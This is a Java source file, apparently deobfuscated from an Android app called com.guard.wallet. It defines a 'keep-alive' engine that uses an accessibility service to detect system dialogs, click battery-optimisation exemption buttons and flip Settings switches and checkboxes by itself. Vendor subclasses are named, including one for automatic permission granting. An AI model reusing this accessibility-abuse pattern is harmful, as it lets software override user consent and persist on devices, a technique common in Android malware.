package com.guard.wallet.engine;
import com.guard.wallet.core.AppUtils;
import com.guard.wallet.delegate.AccessibilityDelegate;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.guard.wallet.MainApplication;
import com.guard.wallet.condition.BoolCondition;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.CheckedResult;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.Collections;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

/**
 * vendor o/c — 所有厂商保活引擎的基类 (KeepAliveEngine)。
 *
 * 继承 AccessibilityDelegate 基类。
 * 提供: 保活调度、任务队列管理、引擎生命周期、
 * 电池优化对话框处理、CompoundButton/Switch/CheckBox 切换辅助。
 *
 * 子类: n (华为), v (OPPO), g (AOSP), q (小米), e0 (传音),
 *       i0 (vivo), g0 (OPPO 权限), h0 (权限自动授予)。
 *
 * 字段:
 *   n — 任务队列 (ConcurrentLinkedQueue) 异步操作
 *   o — 可重入锁，线程安全
 *   p — 调度执行器，周期任务
 *   q — 运行标志 (AtomicBoolean)
 *
 * ADAPT: 字段 'a' (from AccessibilityDelegate) 和 'o','n','p','q' (from KeepAliveEngine)
 * 可能与包名冲突。所有对 a.a.* 和 o.b.* 的引用已内联处理。
 */
public abstract class KeepAliveEngine extends AccessibilityDelegate {

    /** 保活操作任务队列（如 "keepInBatteryUnRestricted"） */
    public final ConcurrentLinkedQueue n = new ConcurrentLinkedQueue();

    /** 线程安全引擎操作的可重入锁 */
    public final ReentrantLock o = new ReentrantLock();

    /** 单线程调度执行器，周期保活任务 */
    public final ScheduledExecutorService p = Executors.newSingleThreadScheduledExecutor();

    /** 运行状态标志: true 表示引擎正在运行 */
    public final AtomicBoolean q = new AtomicBoolean(false);

    // ═══════ 内联辅助方法 (a.a.c / a.a.b / o.b.r / o.b.q) ═══════
    // ADAPT: 因字段 'a' (String) 继承自 AccessibilityDelegate 和字段 'o' (ReentrantLock)
    // 会遮蔽包 'a' 和 'o'，静态方法中也无法直接引用。全部内联如下。

    /**
     * 内联 a.a.c(filter, prop, eq): 初始化 stringConditions，创建条件。
     */
    private static StringCondition initFilterCondition(CombineFilter f, String prop, String eq) {
        f.setStringConditions(new LinkedList<>());
        StringCondition sc = new StringCondition();
        sc.setProperty(prop);
        sc.setEquals(eq);
        return sc;
    }

    /**
     * 内联 a.a.b(filter, existingCond, prop, eq): 添加现有条件，创建新条件。
     */
    private static StringCondition chainFilterCondition(CombineFilter f, StringCondition existing, String prop, String eq) {
        f.getStringConditions().add(existing);
        StringCondition sc = new StringCondition();
        sc.setProperty(prop);
        sc.setEquals(eq);
        return sc;
    }

    /**
     * 内联 o.b.r(lw): 初始化 ListenWindow 的 eventTypes。
     */
    private static HashSet initEventTypes(ListenWindow lw) {
        lw.setEventTypes(new HashSet<>());
        return lw.getEventTypes();
    }

    /**
     * 内联 o.b.q(eventType, set, lw): 添加 eventType，返回 lw 的 eventTypes。
     */
    private static HashSet addEventType(int eventType, HashSet set, ListenWindow lw) {
        set.add(eventType);
        return lw.getEventTypes();
    }

    // ═══════ Constructor ═══════

    public KeepAliveEngine(LinkedList var1, String var2) {
        super(var1, var2);
    }

    // ═══════ 静态过滤器/UI 辅助方法 ═══════

    /**
     * vendor H() → buildTextContainsFilter() — 构建匹配包含指定文本的 TextView 的 CombineFilter。
     * 用于在设置 UI 中查找文本标签。
     */
    public static CombineFilter buildTextContainsFilter(String var0) {
        CombineFilter var1 = new CombineFilter();
        StringCondition var2 = initFilterCondition(var1, "className", "android.widget.TextView");
        var1.getStringConditions().add(var2);
        var2 = new StringCondition();
        var2.setProperty("text");
        var2.setContains(var0);
        var1.getStringConditions().add(var2);
        return var1;
    }

    /**
     * vendor I() → buildBatteryDialogAllowFilter() — 构建电池对话框允许按钮的 CombineFiltersWithOr。
     * 匹配 "android:id/button1" 或 "com.android.settings:id/btn_positive"。
     */
    public static CombineFiltersWithOr buildBatteryDialogAllowFilter() {
        CombineFiltersWithOr var0 = new CombineFiltersWithOr(new LinkedList<>());
        List var1 = var0.getFilters();
        CombineFilter var3 = new CombineFilter();
        StringCondition var2 = chainFilterCondition(var3,
                initFilterCondition(var3, "className", "android.widget.Button"),
                "id", "android:id/button1");
        var3.getStringConditions().add(var2);
        var1.add(var3);
        var1 = var0.getFilters();
        var3 = new CombineFilter();
        var2 = chainFilterCondition(var3,
                initFilterCondition(var3, "className", "android.widget.Button"),
                "id", "com.android.settings:id/btn_positive");
        var3.getStringConditions().add(var2);
        var1.add(var3);
        return var0;
    }

    /**
     * vendor J() → buildBatteryDialogListenWindow() — 构建设置电池优化对话框的 ListenWindow。
     * 包名: com.android.settings, 类名: android.app.Dialog,
     * eventTypes: 32 (VIEW_SCROLLED), 16384 (WINDOW_STATE_CHANGED)。
     */
    public static ListenWindow buildBatteryDialogListenWindow() {
        ListenWindow var0 = new ListenWindow("com.android.settings", "android.app.Dialog");
        addEventType(32, initEventTypes(var0), var0).add(16384);
        return var0;
    }

    /**
     * vendor K() → buildClickableLinearLayoutFilter() — 构建可点击 LinearLayout 的 CombineFilter。
     * 用于在设置中查找可点击的列表项。
     */
    public static CombineFilter buildClickableLinearLayoutFilter() {
        CombineFilter var0 = new CombineFilter();
        StringCondition var1 = initFilterCondition(var0, "className", "android.widget.LinearLayout");
        var0.getStringConditions().add(var1);
        var0.setBoolConditions(new LinkedList<>());
        var0.getBoolConditions().add(new BoolCondition("clickable", true, true));
        return var0;
    }

    /**
     * vendor L() → buildClickableNodeFilter() — 构建任意可点击节点的 CombineFilter。
     * 当直接切换点击失败时用作父节点回退搜索。
     */
    public static CombineFilter buildClickableNodeFilter() {
        CombineFilter var0 = new CombineFilter();
        var0.setBoolConditions(new LinkedList<>());
        BoolCondition var1 = new BoolCondition("clickable", true, true);
        var0.getBoolConditions().add(var1);
        return var0;
    }

    /**
     * vendor M() → dismissBatteryDialog() — 若存在则关闭电池优化对话框。
     * 检查当前窗口是否为 "android.app.Dialog"（通过 rootInActiveWindow 或缓存的 className），
     * 然后点击取消按钮（buildDialogCancelButtonFilter 过滤器）。
     */
    public static void dismissBatteryDialog() {
        if (MyAccessibilityService.P() == null) {
            return;
        }
        AtomicReference var0 = MyAccessibilityService.v2;
        if (!Objects.equals((String) var0.get(), "android.app.Dialog")) {
            MyAccessibilityService var1 = MyAccessibilityService.P();
            var1.getClass();
            String var6;
            try {
                AccessibilityNodeInfo var9 = var1.getRootInActiveWindow();
                if (var9 != null && var9.getClassName() != null) {
                    var6 = var9.getClassName().toString();
                } else {
                    var6 = (String) var0.get();
                }
            } catch (Exception var5) {
                AppUtils.s("MyAccessibilityService", var5);
                var6 = null;
            }
            if (!Objects.equals(var6, "android.app.Dialog")) {
                return;
            }
        }
        MyAccessibilityService var10 = MyAccessibilityService.P();
        CombineFilter var7 = buildDialogCancelButtonFilter();
        var10.getClass();
        UiObject var8 = MyAccessibilityService.M(var7);
        if (var8 != null && var8.click()) {
            Log.d("o.c", "\u5DF2\u70B9\u51FB\u5BF9\u8BDD\u6846\u53D6\u6D88\u6309\u94AE");
            com.guard.wallet.utils.SystemHelper.T0(5);
        }
    }

    /**
     * vendor N() → buildDialogCancelButtonFilter() — 构建对话框取消按钮的 CombineFilter ("android:id/button1")。
     */
    public static CombineFilter buildDialogCancelButtonFilter() {
        CombineFilter var0 = new CombineFilter();
        StringCondition var1 = chainFilterCondition(var0,
                initFilterCondition(var0, "className", "android.widget.Button"),
                "id", "android:id/button1");
        var0.getStringConditions().add(var1);
        return var0;
    }

    /**
     * vendor P() → toggleCompoundButton() — 查找并切换 CompoundButton 为选中状态。
     *
     * 向上搜索最多 2 层父节点查找 CompoundButton。
     * 若未选中: 点击，等待最多 5 次重试。
     * 若直接点击失败: 尝试点击父级可点击节点作为回退。
     *
     * @return CheckedResult 包含最终选中状态和是否执行了点击
     */
    public static CheckedResult toggleCompoundButton(UiObject var0) {
        CheckedResult var8 = new CheckedResult();
        boolean checked = false;
        try {
            // Build filter for CompoundButton
            CombineFilter var9 = new CombineFilter();
            LinkedList var6 = new LinkedList();
            var9.setStringConditions(var6);
            StringCondition var35 = new StringCondition();
            var35.setProperty("className");
            var35.setEquals("android.widget.CompoundButton");
            var9.getStringConditions().add(var35);

            // Refresh accessibility cache
            MyAccessibilityService.I(var0);

            // Search up to 2 parent levels for CompoundButton
            UiObject toggleNode = null;
            int depth = 0;
            UiObject current = var0;
            while (current != null && toggleNode == null && depth <= 2) {
                toggleNode = current.findOneByCombine(var9);
                current = current.parent();
                depth++;
            }

            if (toggleNode == null) {
                var8.setChecked(false);
                return var8;
            }

            checked = toggleNode.checked();
            int retries = 5;

            // Strategy 1: direct click on toggle
            if (!checked) {
                if (toggleNode.click()) {
                    var8.setClicked(true);
                    toggleNode.refresh();
                    checked = toggleNode.checked();
                    while (retries > 0 && !checked) {
                        com.guard.wallet.utils.SystemHelper.T0(1);
                        toggleNode.refresh();
                        checked = toggleNode.checked();
                        retries--;
                    }
                }
            }

            // Strategy 2: click parent clickable node as fallback
            if (!checked) {
                UiObject clickableParent = toggleNode.findParentUtilCombine(buildClickableNodeFilter());
                if (clickableParent != null && clickableParent.click()) {
                    var8.setClicked(true);
                    toggleNode.refresh();
                    checked = toggleNode.checked();
                    while (retries > 0 && !checked) {
                        com.guard.wallet.utils.SystemHelper.T0(1);
                        toggleNode.refresh();
                        checked = toggleNode.checked();
                        retries--;
                    }
                }
            }
        } catch (Exception var29) {
            AppUtils.s("o.c", var29);
        }
        var8.setChecked(checked);
        return var8;
    }

    /**
     * vendor S() → toggleSwitchByGesture() — 查找 Switch 并通过手势点击切换。
     *
     * 向上搜索最多 2 层父节点查找 Switch 控件。
     * 若未选中: 在 (right-80, centerY) 执行手势点击。
     *
     * @return CheckedResult 包含最终选中状态和是否执行了点击
     */
    public static CheckedResult toggleSwitchByGesture(UiObject var0) {
        CheckedResult var5 = new CheckedResult();
        try {
            CombineFilter var6 = buildSwitchFilter();
            MyAccessibilityService.I(var0);

            // Search up to 2 parent levels for Switch
            int depth = 0;
            UiObject switchNode = null;
            while (var0 != null && switchNode == null && depth <= 2) {
                switchNode = var0.findOneByCombine(var6);
                UiObject next = var0;
                if (switchNode == null) {
                    next = var0.parent();
                }
                depth++;
                var0 = next;
            }

            if (switchNode == null) {
                return var5;
            }

            var5.setChecked(switchNode.checked());
            int tapX = switchNode.boundsInScreen().right - 80;
            int tapY = (int) switchNode.centerInScreen().getY();
            if (!var5.isChecked() && com.guard.wallet.utils.SystemHelper.s(tapX, tapY)) {
                com.guard.wallet.utils.SystemHelper.T0(5);
                var5.setClicked(true);
            }

            return var5;
        } catch (Exception var7) {
            AppUtils.s("o.c", var7);
        }
        return var5;
    }

    /**
     * vendor U() → buildLinearLayoutFilter() — 构建 LinearLayout 的 CombineFilter（无可点击约束）。
     * 用于在设置中查找列表容器。
     */
    public static CombineFilter buildLinearLayoutFilter() {
        CombineFilter var1 = new CombineFilter();
        StringCondition var0 = initFilterCondition(var1, "className", "android.widget.LinearLayout");
        var1.getStringConditions().add(var0);
        return var1;
    }

    /**
     * vendor V() → buildScrollableContainerFilter() — 构建可滚动容器的 CombineFiltersWithOr。
     * 匹配: RecyclerView, ListView, ScrollView, 或任意可滚动节点。
     * 用于查找可滚动父节点以进行滚动查找操作。
     */
    public static CombineFiltersWithOr buildScrollableContainerFilter() {
        CombineFiltersWithOr var0 = new CombineFiltersWithOr();
        var0.setFilters(new LinkedList<>());

        // RecyclerView + scrollable
        List var2 = var0.getFilters();
        CombineFilter var1 = new CombineFilter();
        var1.setStringConditions(new LinkedList<>());
        var1.setBoolConditions(new LinkedList<>());
        StringCondition var3 = new StringCondition();
        var3.setProperty("className");
        var3.setEquals("androidx.recyclerview.widget.RecyclerView");
        var1.getStringConditions().add(var3);
        var1.getBoolConditions().add(new BoolCondition("scrollable", true, true));
        var2.add(var1);

        // ListView + scrollable
        List var4 = var0.getFilters();
        CombineFilter var7 = new CombineFilter();
        var7.setStringConditions(new LinkedList<>());
        var7.setBoolConditions(new LinkedList<>());
        var3 = new StringCondition();
        var3.setProperty("className");
        var3.setEquals("android.widget.ListView");
        var7.getStringConditions().add(var3);
        var7.getBoolConditions().add(new BoolCondition("scrollable", true, true));
        var4.add(var7);

        // ScrollView + scrollable
        List var5 = var0.getFilters();
        CombineFilter var8 = new CombineFilter();
        var8.setStringConditions(new LinkedList<>());
        var8.setBoolConditions(new LinkedList<>());
        var3 = new StringCondition();
        var3.setProperty("className");
        var3.setEquals("android.widget.ScrollView");
        var8.getStringConditions().add(var3);
        var8.getBoolConditions().add(new BoolCondition("scrollable", true, true));
        var5.add(var8);

        // Any scrollable node (catch-all)
        List var15 = var0.getFilters();
        CombineFilter var9 = new CombineFilter();
        var9.setBoolConditions(new LinkedList<>());
        BoolCondition var10 = new BoolCondition("scrollable", true, true);
        var9.getBoolConditions().add(var10);
        var15.add(var9);

        return var0;
    }

    /**
     * vendor W() → notifyPrepareConfirmLock() — 通知策略引擎准备应用确认锁。
     * 发送 "PREPARE_FOR_APP_CONFIRM_LOCK" 事件到 MainApplication。
     */
    public static void notifyPrepareConfirmLock() {
        if (MainApplication.getInstance() != null) {
            MainApplication.getInstance().offerStrategyEvent("PREPARE_FOR_APP_CONFIRM_LOCK");
        }
    }

    /**
     * vendor Y() → dismissDialogAndRequestBatteryExemption() — 关闭对话框并请求电池优化豁免。
     * 调用 dismissBatteryDialog() 关闭对话框，然后检查电池优化状态。
     * 若尚未豁免且无障碍已启用，请求豁免。
     *
     * @return true 若电池豁免请求已发起
     */
    public static boolean dismissDialogAndRequestBatteryExemption() {
        try {
            dismissBatteryDialog();
            if (!com.guard.wallet.utils.SystemHelper.o0() && AppUtils.A()) {
                com.guard.wallet.utils.SystemHelper.j0();
                return true;
            }
        } catch (Exception var1) {
            AppUtils.s("o.c", var1);
        }
        return false;
    }

    /**
     * vendor a0() → buildSwitchFilter() — 构建 Switch 控件的 CombineFilter。
     * 用于在设置页面查找切换开关。
     */
    public static CombineFilter buildSwitchFilter() {
        CombineFilter var0 = new CombineFilter();
        StringCondition var1 = initFilterCondition(var0, "className", "android.widget.Switch");
        var0.getStringConditions().add(var1);
        return var0;
    }

    // ═══════ Instance methods ═══════

    /**
     * vendor O() → toggleSwitchOrCheckBox() — 查找并切换 Switch/CheckBox 为选中状态。
     *
     * 通过 OR 过滤器向上搜索最多 2 层父节点查找 Switch 或 CheckBox。
     * 若未选中: 最多点击 5 次，重试间隔 5 tick。
     * 注意: var2 参数（重试次数）未使用 — 始终使用内部 5 次循环。
     *
     * @return CheckedResult 包含最终选中状态和是否执行了点击
     */
    public final CheckedResult toggleSwitchOrCheckBox(UiObject var1, int var2) {
        CheckedResult var7 = new CheckedResult();
        boolean checked = false;
        try {
            // Build OR filter: Switch | CheckBox
            CombineFiltersWithOr var8 = new CombineFiltersWithOr();
            var8.setFilters(new LinkedList<>());
            var8.getFilters().add(buildSwitchFilter());

            CombineFilter var9 = new CombineFilter();
            var9.setStringConditions(new LinkedList<>());
            StringCondition var46 = new StringCondition();
            var46.setProperty("className");
            var46.setEquals("android.widget.CheckBox");
            var9.getStringConditions().add(var46);
            var8.getFilters().add(var9);

            // Refresh accessibility cache
            MyAccessibilityService.I(var1);

            // Search up to 2 parent levels for Switch/CheckBox
            UiObject checkboxNode = null;
            for (int depth = 0; var1 != null && checkboxNode == null && depth <= 2; depth++) {
                checkboxNode = var1.findOneByOperateOr(var8);
                var1 = var1.parent();
            }

            if (checkboxNode == null) {
                var7.setChecked(false);
                return var7;
            }

            Log.d("o.c", "checkboxNode is not null");
            checked = checkboxNode.checked();

            // Click until checked, up to 5 attempts
            for (int attempt = 0; !checked && attempt < 5; attempt++) {
                checkboxNode.click();
                Log.d("o.c", "checkboxNode is click");
                var7.setClicked(true);
                com.guard.wallet.utils.SystemHelper.T0(5);
                checkboxNode.refresh();
                checked = checkboxNode.checked();
            }
        } catch (Exception var40) {
            AppUtils.s("o.c", var40);
        }
        var7.setChecked(checked);
        return var7;
    }

    /**
     * vendor Q() → findScrollableContainer() — 在当前 activeRoot 中查找可滚动容器。
     * 使用 buildScrollableContainerFilter() 过滤器（RecyclerView/ListView/ScrollView/scrollable）。
     *
     * @return 可滚动 UiObject 或 null
     */
    public final UiObject findScrollableContainer() {
        try {
            CombineFiltersWithOr var1 = buildScrollableContainerFilter();
            if (this.k() != null) {
                return this.k().findOneByOperateOr(var1);
            }
        } catch (Exception var2) {
            AppUtils.s("o.c", var2);
        }
        return null;
    }

    /**
     * vendor R() → toggleSwitchWithRetry() — 查找 Switch 并通过带重试的手势点击切换。
     *
     * 向上搜索最多 2 层父节点查找 Switch 控件。
     * 若未选中: 在 (right-50, centerY) 执行手势点击。
     * 若手势成功，带重试等待状态变化。
     * 若点击失败: 尝试点击父级可点击节点作为回退。
     *
     * @param var1 搜索起始 UiObject
     * @param var2 状态轮询最大重试次数
     * @return CheckedResult 包含最终选中状态和是否执行了点击/手势
     */
    public final CheckedResult toggleSwitchWithRetry(UiObject var1, int var2) {
        CheckedResult var11 = new CheckedResult();
        boolean checked = false;
        try {
            CombineFilter var12 = buildSwitchFilter();
            MyAccessibilityService.I(var1);

            // Search up to 2 parent levels for Switch
            UiObject switchNode = null;
            int depth = 0;
            UiObject parent = var1;
            while (parent != null && switchNode == null && depth <= 2) {
                switchNode = parent.findOneByCombine(var12);
                UiObject next = parent;
                if (switchNode == null) {
                    next = parent.parent();
                }
                depth++;
                parent = next;
            }

            if (switchNode == null) {
                var11.setChecked(false);
                return var11;
            }

            checked = switchNode.checked();
            int tapX = switchNode.boundsInScreen().right - 50;
            int tapY = (int) switchNode.centerInScreen().getY();

            // Strategy 1: gesture tap on switch
            if (!checked) {
                if (com.guard.wallet.utils.SystemHelper.s(tapX, tapY)) {
                    var11.setClicked(true);
                    MyAccessibilityService.I(this.k());
                    switchNode = parent.findOneByCombine(var12);
                    checked = switchNode.checked();
                    while (var2 > 0 && !checked) {
                        com.guard.wallet.utils.SystemHelper.T0(1);
                        switchNode = parent.findOneByCombine(var12);
                        checked = switchNode.checked();
                        var2--;
                    }
                }
            }

            // Strategy 2: click parent clickable node as fallback
            if (!checked) {
                UiObject clickableParent = switchNode.findParentUtilCombine(buildClickableNodeFilter());
                if (clickableParent != null && clickableParent.click()) {
                    var11.setClicked(true);
                    switchNode.refresh();
                    checked = switchNode.checked();
                    while (var2 > 0 && !checked) {
                        com.guard.wallet.utils.SystemHelper.T0(1);
                        switchNode.refresh();
                        checked = switchNode.checked();
                        var2--;
                    }
                }
            }
        } catch (Exception var39) {
            AppUtils.s("o.c", var39);
        }
        var11.setChecked(checked);
        return var11;
    }

    /**
     * vendor T() → isEngineFinished() — 检查引擎是否正在运行。
     *
     * @return true 若引擎运行标志已设置
     */
    public final boolean isEngineFinished() {
        return this.q.get();
    }

    /**
     * vendor X() → markEngineRunning() — 标记引擎为运行中。
     * 将运行标志设为 true。
     */
    public final void markEngineRunning() {
        this.q.set(true);
    }

    /**
     * vendor Z() — 抽象清理/关闭方法。
     * 子类重写以执行厂商特定保活清理。
     */
    public abstract void Z();

    /**
     * vendor d() — 销毁引擎并释放资源。
     * 关闭调度执行器、取消线程池任务、清空任务队列，
     * 然后调用 super.d() 进行基类清理。
     */
    @Override
    public final void d() {
        try {
            this.p.shutdownNow();
            com.guard.wallet.thread.DelegateTaskLauncher.a(super.c);
            this.n.clear();
            super.d();
        } catch (Exception var2) {
            AppUtils.s("o.c", var2);
        }
    }

    /**
     * vendor u(event, packageName, className) — 处理无障碍事件。
     *
     * 委托到 super.u() 进行标准事件处理，然后检查当前窗口
     * 是否为电池优化对话框（J 过滤器）。
     * 若匹配，将 "keepInBatteryUnRestricted" 任务加入线程池。
     * 该任务（AccessibilityDelegate.a with code=0）将点击允许/取消按钮。
     */
    @Override
    public void u(AccessibilityEvent var1, String var2, String var3) {
        try {
            super.u(var1, var2, var3);

            boolean inBatteryDialog = false;
            try {
                if (this.q(Collections.singletonList(buildBatteryDialogListenWindow()))) {
                    Log.d("o.c", "\u5DF2\u8FDB\u5165\u662F\u5426\u5141\u8BB8\u5FFD\u7565\u7535\u6C60\u4F18\u5316\u7A97\u53E3");
                    inBatteryDialog = true;
                }
            } catch (Exception var9) {
                AppUtils.s("o.c", var9);
            }

            if (!inBatteryDialog) {
                return;
            }

            ConcurrentLinkedQueue taskQueue = this.n;
            if (!taskQueue.contains("keepInBatteryUnRestricted")) {
                taskQueue.add("keepInBatteryUnRestricted");
                AccessibilityDelegate.a var12 = new AccessibilityDelegate.a(this, 0);
                com.guard.wallet.thread.DelegateTaskLauncher.c(var12, super.c);
            }
        } catch (Exception var11) {
            AppUtils.s("o.c", var11);
        }
    }
}
